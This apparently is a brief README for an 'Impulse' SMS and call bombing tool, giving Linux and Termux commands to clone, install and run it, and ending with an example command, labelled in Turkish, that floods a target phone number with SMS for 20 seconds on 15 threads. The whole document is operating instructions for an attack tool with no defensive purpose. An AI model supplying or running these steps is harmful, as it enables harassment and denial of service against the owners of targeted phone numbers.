# New1impulse-bomb

Linux:

sudo apt update
sudo apt install python3 python3-pip git -y

git clone https://github.com/LimerBoy/Impulse

cd Impulse/

pip3 install -r requirements.txt

python3 impulse.py --help

Termux:

pkg update
pkg install python3 python3-pip3 git -y

git clone https://github.com/LimerBoy/Impulse

cd Impulse/

pip3 install -r requirements.txt

python3 impulse.py --help

📞  Örnek SMS ve Çağrı seli:
python3 impulse.py --yöntem SMS --Time 20 --threads 15 --hedef +90555555555
